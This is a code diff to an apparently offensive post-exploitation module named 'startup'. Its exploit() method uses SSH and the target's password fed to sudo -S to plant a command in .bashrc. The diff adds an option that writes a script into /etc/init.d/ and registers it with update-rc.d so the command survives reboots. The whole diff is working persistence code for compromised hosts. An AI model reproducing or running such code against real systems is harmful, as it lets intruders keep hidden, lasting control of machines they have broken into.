@@ -8,11 +8,17 @@ class Startup(Module):
         self.name = "startup"
         self.command = command
         self.options = {
-                "bash": Option("bash", "true", "Add to bashrc", False),
+                "bash": Option("bash", True, "Add to bashrc", False),
+		"init": Option("init", False, "Add to system startup", False),
                 }
 
     def exploit(self, command):
 	if(self.get_value("bash")):
-            self.target.ssh.exec_command("nohup echo " + self.target.pword + " | sudo -S echo \'" + self.command + " & \' >> .bashrc")
-        print(GOOD + self.name + " module success")
+            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.command + " > /dev/null \' >> .bashrc")
+        if(self.get_value("init")):
+	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.command + "\' > file1234.sh")
+	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S chmod +x file1234.sh")
+	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv file1234.sh /etc/init.d/")
+	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S update-rc.d file1234.sh defaults")
+	print(GOOD + self.name + " module success")
 
